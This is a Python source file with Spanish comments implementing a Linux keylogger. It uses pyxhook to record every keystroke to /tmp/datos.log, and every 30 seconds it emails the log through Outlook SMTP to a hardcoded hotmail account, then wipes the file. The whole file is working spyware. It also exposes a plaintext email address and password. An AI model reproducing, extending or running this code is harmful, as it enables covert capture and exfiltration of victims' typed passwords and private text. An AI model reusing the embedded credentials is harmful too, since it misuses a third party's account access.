import pyxhook
import time, datetime
import smtplib
import sys

#Fichero donde se van a guardar  las pulsaciones
log_file='/tmp/datos.log'

dict_key = {
        "Shift_R": "",
        "Shift_L": "",
        "space":" ",
        "period":".",
        "Return":"\n",
        "[65027]":"[Alt Gr]",
        "colon":":",
        "semicolon":';',
        "comma":',',
        "slash":'/',
        "underscore":'_',
        "Tab":'[Tab]		',
        "ntilde":'[ny]',
        "plus":'*',
        "BackSpace":'[Borrar]',
	"ampersand":'&',
	"parenleft":'(',
	"parenright":')',
	"equal":'=',
	"quotedbl": '"',
	"exclam":'!',
	"question":'?',
	"Down":'[flecha abajo]',
	"Left":'[flecha izquierda]',
	"Right":'[flecha derecha]',
	"Up":'[flecha arriba]'
}

#Esta funcion es llamada cuando se presiona una tecla
def OnKeyPress(event):
    global running

    fob=open(log_file,'a')

    if (event.Ascii==90): #Si pulsamos Z se termina el programa
        fob.close()
        new_hook.cancel()
        running = False   #El while cambiara a false y hara sys.exit

    elif (event.Ascii == 50):
        fob.write("@")
    elif(event.Ascii == 51):
        fob.write("#")
    elif (event.Ascii == 52):
        fob.write("~")
    else:
        fob.write(dict_key.get(event.Key, event.Key))

	#print ("letra presionada: "+event.Key+' codigo ascii: ')
	#print (event.Ascii)


def TimeOut():
	if time.time() > timeout:
		return True
	else:
		return False


def SendEmail(user, pwd, recipient, asunto, body):

    FROM = user
    TO = recipient if type(recipient) is list else [recipient]  #Validamos si es a mas de una persona quien enviamos el correo
    ASUNTO = asunto
    TEXT = body

    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (FROM, ", ".join(TO), ASUNTO, TEXT)

    try:
        server = smtplib.SMTP("smtp-mail.outlook.com", 587)
        server.ehlo()
        server.starttls()
        server.login(user, pwd)             #Cuenta desde donde se va a enviar el correo
        print("[*] Enviando keylogger....\nContenido:")
        print(body)
        server.sendmail(user, TO, message)  #Cuenta hacia donde se va a enviar
        server.close()
        print("\nCorreo enviado satisfactoriamente")
    except:
        print("\nError al mandar correo!")


def FormatAndSendLogEmail():
	
    hotmail_user = "kevinliebergen@hotmail.com"
    hotmail_pass = "Amimer1."

    with open(log_file, 'r+') as f:
        actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read().replace('\n','')
        data = 'Log capturado a las: '+actualdate+ '\n' + data
        SendEmail(hotmail_user, hotmail_pass, hotmail_user, 'Nuevo log - '+actualdate, data)
        f.seek(0)		#0 para apuntar al principio del fichero
        f.truncate()	#Trunca el fichero ( borra todo lo que hay)


wait_seconds =30;
timeout = time.time() + wait_seconds


#Instancia la clase hookManager
new_hook=pyxhook.HookManager()

#Escucha a todas las pulsaciones
new_hook.KeyDown=OnKeyPress

#Vigila elementos del teclado
new_hook.HookKeyboard()

#Empieza la sesion
new_hook.start()

running = True

while running:
    if TimeOut():
        FormatAndSendLogEmail()
        timeout = time.time() + wait_seconds #Tiempo limite en segundos, lo igualamos al tiempo actual mas los segundos a esperara


sys.exit(0)

#COMENTARIO PRUEBA
